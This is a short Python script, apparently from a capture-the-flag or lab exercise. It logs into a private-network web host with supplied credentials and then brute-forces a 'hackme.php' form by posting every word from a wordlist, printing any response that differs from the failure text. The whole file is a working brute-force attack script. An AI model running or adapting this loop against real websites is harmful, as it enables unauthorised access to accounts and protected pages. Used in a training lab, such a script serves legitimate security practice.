import requests
import sys
lines = []

with open(sys.argv[1], 'r') as wordlist:
    lines = wordlist.readlines()

s = requests.Session()

credentials = {
    'login_field': sys.argv[2],
    'cred_field': sys.argv[3]
}

response = s.post('http://172.25.0.32/check.php', data=credentials)
#print(response.text)

#response1 = s.post('http://172.25.0.31/hackme.php')
#print(response1.text)

for i in lines:
    
    mydata = {'new_flag':i.replace("\n","")}
    # sets the post parameter of flag_value to the current word in the wordlist

    response2 = s.post('http://172.25.0.32/hackme.php', data=mydata)
    # post the information to the hackme.php webpage using the current session(s)

    currentPageText = response2.text
    # save the current page text to a variable

    if "find the flag" not in currentPageText:
        print(response2.text)
    # check to see if the text above (brute-force) is not there. If it's not, show us what was actually returned!